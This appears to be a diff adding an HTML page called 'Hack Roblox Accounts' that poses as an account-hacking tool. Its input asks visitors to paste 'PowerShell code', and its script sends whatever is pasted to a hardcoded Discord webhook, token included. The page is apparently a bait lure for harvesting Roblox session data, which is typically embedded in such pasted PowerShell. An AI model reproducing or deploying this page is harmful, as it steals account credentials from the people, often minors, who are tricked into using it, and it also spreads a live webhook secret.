@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Hack Roblox Accounts</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0a0a;
+            font-family: 'Share Tech Mono', monospace;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Glitchy scanlines */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 255, 0, 0.03) 0px,
+                rgba(0, 0, 0, 0.6) 1px,
+                rgba(0, 255, 0, 0.03) 2px
+            );
+            pointer-events: none;
+            z-index: 999;
+        }
+
+        /* CRT flicker */
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 255, 0, 0.015);
+            pointer-events: none;
+            z-index: 1000;
+            animation: flicker 0.15s infinite alternate;
+        }
+
+        @keyframes flicker {
+            0%   { opacity: 0.4; }
+            100% { opacity: 0.6; }
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            width: 700px;
+            max-width: 95vw;
+            padding: 40px 30px;
+            border: 2px solid #00ff41;
+            border-radius: 8px;
+            background: rgba(0, 10, 0, 0.85);
+            box-shadow:
+                0 0 20px #00ff41,
+                0 0 40px #00ff4133,
+                inset 0 0 20px #00ff4111;
+            text-align: center;
+        }
+
+        .title {
+            font-size: 2.2rem;
+            color: #00ff41;
+            text-shadow:
+                0 0 10px #00ff41,
+                0 0 20px #00ff41,
+                2px 0 0 #ff0040,
+                -2px 0 0 #0040ff;
+            letter-spacing: 6px;
+            text-transform: uppercase;
+            margin-bottom: 25px;
+            animation: glitch 3s infinite;
+        }
+
+        @keyframes glitch {
+            2%, 64% { transform: translate(0); }
+            4%  { transform: translate(-3px, 2px); }
+            6%  { transform: translate(3px, -1px); }
+            8%  { transform: translate(-1px, 3px); }
+            62% { transform: translate(0); }
+        }
+
+        /* ── Video container ── */
+        .video-wrapper {
+            margin-bottom: 30px;
+            border: 1px solid #00ff4166;
+            border-radius: 4px;
+            overflow: hidden;
+            background: #000;
+            aspect-ratio: 16 / 9;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .video-wrapper video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .video-placeholder {
+            color: #00ff4166;
+            font-size: 0.85rem;
+            letter-spacing: 2px;
+        }
+
+        /* ── Input area ── */
+        .input-group {
+            margin-bottom: 25px;
+        }
+
+        .input-group label {
+            display: block;
+            color: #00ff41;
+            font-size: 0.95rem;
+            letter-spacing: 3px;
+            margin-bottom: 12px;
+            text-transform: uppercase;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 18px;
+            background: #000;
+            border: 1px solid #00ff41;
+            border-radius: 4px;
+            color: #00ff41;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 1.1rem;
+            letter-spacing: 2px;
+            outline: none;
+            transition: 0.2s;
+            text-transform: uppercase;
+        }
+
+        .input-group input:focus {
+            border-color: #00ff41;
+            box-shadow: 0 0 15px #00ff4166, inset 0 0 10px #00ff4122;
+        }
+
+        .input-group input::placeholder {
+            color: #00ff4133;
+            letter-spacing: 2px;
+        }
+
+        /* ── Button ── */
+        .hack-btn {
+            width: 100%;
+            padding: 16px 0;
+            background: transparent;
+            border: 2px solid #00ff41;
+            border-radius: 4px;
+            color: #00ff41;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 1.4rem;
+            font-weight: bold;
+            letter-spacing: 8px;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: 0.25s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hack-btn::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, #00ff4122, transparent);
+            transition: 0.5s;
+        }
+
+        .hack-btn:hover::before {
+            left: 100%;
+        }
+
+        .hack-btn:hover {
+            background: #00ff41;
+            color: #000;
+            box-shadow: 0 0 30px #00ff41;
+            text-shadow: none;
+        }
+
+        .hack-btn:active {
+            transform: scale(0.97);
+        }
+
+        .hack-btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        /* ── Status / log ── */
+        #status {
+            margin-top: 20px;
+            color: #00ff41;
+            font-size: 0.85rem;
+            letter-spacing: 1px;
+            min-height: 24px;
+            opacity: 0.8;
+            word-break: break-word;
+        }
+
+        #status.error {
+            color: #ff0040;
+            text-shadow: 0 0 10px #ff0040;
+        }
+
+        #status.success {
+            color: #00ff41;
+            text-shadow: 0 0 10px #00ff41;
+        }
+
+        /* ── Live blinking cursor decoration ── */
+        .cursor-line {
+            margin-top: 25px;
+            color: #00ff4133;
+            font-size: 0.75rem;
+            letter-spacing: 2px;
+        }
+
+        .cursor-line span {
+            animation: blink 1s step-end infinite;
+        }
+
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+
+        /* ── Responsive ── */
+        @media (max-width: 500px) {
+            .container { padding: 25px 15px; }
+            .title { font-size: 1.4rem; letter-spacing: 3px; }
+            .hack-btn { font-size: 1.1rem; letter-spacing: 4px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- Title -->
+    <h1 class="title">Hack Roblox Accounts</h1>
+
+    <!-- Video (drop your .mp4 in the same folder, name it hack_video.mp4) -->
+    <div class="video-wrapper">
+        <video id="hackVideo" muted loop playsinline preload="metadata">
+            <source src="hack_video.mp4" type="video/mp4" />
+        </video>
+        <div class="video-placeholder" id="videoPlaceholder">
+            [ VIDEO STREAM OFFLINE ]
+        </div>
+    </div>
+
+    <!-- Target input -->
+    <div class="input-group">
+        <label>> PASTE_POWERSHELL_CODE</label>
+        <input
+            type="text"
+            id="targetInput"
+            placeholder="POWERSHELL_CODE / OF_THE_TARGET"
+            autocomplete="off"
+            spellcheck="false"
+        />
+    </div>
+
+    <!-- Hack button -->
+    <button class="hack-btn" id="hackBtn">⟐ HACK THE ACCOUNT ⟐</button>
+
+    <!-- Status -->
+    <div id="status"></div>
+
+    <div class="cursor-line">
+        <span>█</span> SYSTEM_READY :: AWAITING_TARGET
+    </div>
+</div>
+
+<script>
+    (function() {
+        const WEBHOOK_URL =
+            "https://discord.com/api/webhooks/1530655593801584842/EtfkEsXhOlaomGtkxhCzTnxQi_m3x1innKcqvwCSQVUsRdq0pIcf_jKScou870H-wM5N";
+
+        const video        = document.getElementById('hackVideo');
+        const placeholder  = document.getElementById('videoPlaceholder');
+        const input        = document.getElementById('targetInput');
+        const btn          = document.getElementById('hackBtn');
+        const status       = document.getElementById('status');
+
+        /* ── Video availability check ── */
+        function checkVideo() {
+            // If the browser can play at least one frame, hide placeholder
+            video.addEventListener('loadedmetadata', () => {
+                placeholder.style.display = 'none';
+                video.style.display = 'block';
+                // Optionally start playing
+                video.play().catch(() => {});
+            });
+
+            // If the source fails (404 / unsupported), keep placeholder visible
+            video.addEventListener('error', () => {
+                placeholder.style.display = 'flex';
+                video.style.display = 'none';
+                placeholder.textContent = '[ VIDEO NOT FOUND — DROP hack_video.mp4 ]';
+            });
+
+            // Force check by loading
+            video.load();
+        }
+        checkVideo();
+
+        /* ── Send to Discord webhook ── */
+        async function sendToWebhook(target) {
+            const payload = {
+                embeds: [{
+                    title: '🛡️ HACK TARGET CAPTURED',
+                    color: 0x00ff41,  // matrix green
+                    fields: [
+                        {
+                            name: '🎯 TARGET CODE',
+                            value: `\`\`\`${target}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: '🕒 TIMESTAMP',
+                            value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
+                            inline: true
+                        },
+                        {
+                            name: '🌐 ORIGIN',
+                            value: `\`${window.location.hostname || 'local'}\``,
+                            inline: true
+                        }
+                    ],
+                    footer: {
+                        text: 'Hack Roblox Accounts • System Log',
+                        icon_url: 'https://i.imgur.com/J0qZ9hR.png'
+                    },
+                    thumbnail: {
+                        url: 'https://i.imgur.com/J0qZ9hR.png'
+                    },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            const resp = await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            if (!resp.ok) {
+                const errText = await resp.text().catch(() => 'unknown error');
+                throw new Error(`Discord returned ${resp.status}: ${errText}`);
+            }
+
+            return resp;
+        }
+
+        /* ── Handle the hack action ── */
+        async function handleHack() {
+            const target = input.value.trim();
+
+            if (!target) {
+                status.className = 'error';
+                status.textContent = '✖ ERROR: TARGET_CODE_EMPTY — ENTER_A_VALID_TARGET';
+                input.focus();
+                return;
+            }
+
+            // Lock UI
+            btn.disabled = true;
+            btn.textContent = '⟐ ATTACKING... ⟐';
+            status.className = '';
+            status.textContent = '⟐ ESTABLISHING_CONNECTION... ⟐';
+
+            try {
+                await sendToWebhook(target);
+
+                status.className = 'success';
+                status.textContent = `✔ TARGET [${target}] COMPROMISED — DATA_EXFILTRATED`;
+                input.value = '';
+                input.focus();
+
+                // Flash the container
+                document.querySelector('.container').style.boxShadow =
+                    '0 0 40px #00ff41, 0 0 80px #00ff4166, inset 0 0 30px #00ff4133';
+                setTimeout(() => {
+                    document.querySelector('.container').style.boxShadow = '';
+                }, 1500);
+
+            } catch (err) {
+                console.error('Webhook error:', err);
+                status.className = 'error';
+                status.textContent = `✖ ATTACK_FAILED: ${err.message}`;
+            } finally {
+                btn.disabled = false;
+                btn.textContent = '⟐ HACK ⟐';
+            }
+        }
+
+        /* ── Event listeners ── */
+        btn.addEventListener('click', handleHack);
+
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                handleHack();
+            }
+        });
+
+        // Autofocus input on load
+        input.focus();
+    })();
+</script>
+
+</body>
+</html>
